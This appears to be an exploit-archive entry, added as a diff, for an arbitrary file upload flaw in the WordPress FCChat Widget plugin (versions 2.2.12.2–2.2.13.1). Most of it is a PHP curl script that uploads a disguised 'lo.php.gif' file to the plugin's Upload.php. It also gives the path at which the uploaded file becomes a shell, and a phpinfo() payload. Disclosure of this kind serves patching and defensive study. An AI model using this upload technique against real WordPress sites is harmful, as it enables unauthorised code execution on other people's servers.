@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/53855/info
+
+WordPress FCChat Widget plugin is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.
+
+WordPress FCChat Widget plugin 2.2.12.2 through versions 2.2.13.1 are vulnerable. 
+
+<?php
+
+$uploadfile="lo.php.gif";
+$ch = 
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/fcchat/html/Upload.php?id=1");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('Filedata'=>"@$uploadfile",
+                'Submit'=>'submit'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access : 
+http://www.exemple.com/wordpress/wp-content/plugins/fcchat/html/images/1_lo.php.gif
+
+lo.php.gif
+<?php
+phpinfo();
+?>
